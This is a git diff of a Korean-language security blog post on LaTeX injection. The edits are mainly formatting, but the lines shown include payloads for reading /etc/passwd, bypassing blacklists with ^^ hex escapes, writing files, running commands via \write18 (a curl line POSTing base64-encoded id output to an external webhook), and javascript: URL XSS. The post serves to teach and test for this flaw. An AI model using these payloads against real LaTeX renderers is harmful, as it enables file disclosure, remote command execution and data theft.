@@ -18,13 +18,13 @@ tags:
 sidebar:
 ---
 ## Intro
-$ \LaTeX 란 주로 자연과학 혹은 수리 영역 논문에 사용되는 문서 작성 도구의 일종으로 $ \TeX 문법을 쉽게 사용하기 위해 만든 메크로 모음집이다.   
+$ \LaTeX $ 란 주로 자연과학 혹은 수리 영역 논문에 사용되는 문서 작성 도구의 일종으로 $ \TeX $ 문법을 쉽게 사용하기 위해 만든 메크로 모음집이다.   
 
 스크립트 기능이 강하기 때문에 RCE, XSS 등의 공격이 가능하여 위험도는 매우 높습니다.   
 ## Detect & Exploit 
 ### Detect
-아래 사진과 같은 수식들이 보인다면 $ \LaTeX 문법을 사용하고 있을 가능성이 큽니다.  
-![](/assets/images/posts/2024-12-05-LaTeX-Injection/LaTeXInjection_Exam.png)
+아래 사진과 같은 수식들이 보인다면 LaTeX 문법을 사용하고 있을 가능성이 큽니다.  
+![](/assets/images/posts/2024-12-05-LaTeX-Injection/LaTeXInjection_Exam.png)   
 ### Exploit
 #### Read File
 ```tex
@@ -54,13 +54,17 @@ $ \LaTeX 란 주로 자연과학 혹은 수리 영역 논문에 사용되는 문
 \usepackage{verbatim}
 \verbatiminput{/etc/passwd}
 ```
+
 #### Bypass Blacklist 
+
 - ^^41 == A
 - ^^7e == ~
 ```tex
 \lstin^^70utlisting{/etc/passwd}
-```   
+```
+
 #### Write File
+
 ```tex
 \newwrite\outfile
 \openout\outfile=cmd.tex
@@ -68,7 +72,8 @@ $ \LaTeX 란 주로 자연과학 혹은 수리 영역 논문에 사용되는 문
 \write\outfile{Line 2}
 \write\outfile{I like trains}
 \closeout\outfile
-```   
+```
+
 #### Command Execution
 
 ```tex
@@ -88,8 +93,10 @@ $ \LaTeX 란 주로 자연과학 혹은 수리 영역 논문에 사용되는 문
 
 ```tex
 \immediate/write18{curl https://webhook -X POST -d a=$(id|base64)}
-```   
+```
+
 #### Cross Site Scripting
+
 ```tex
 \url{javascript:alert(1)}
 \href{javascript:alert(1)}{placeholder}
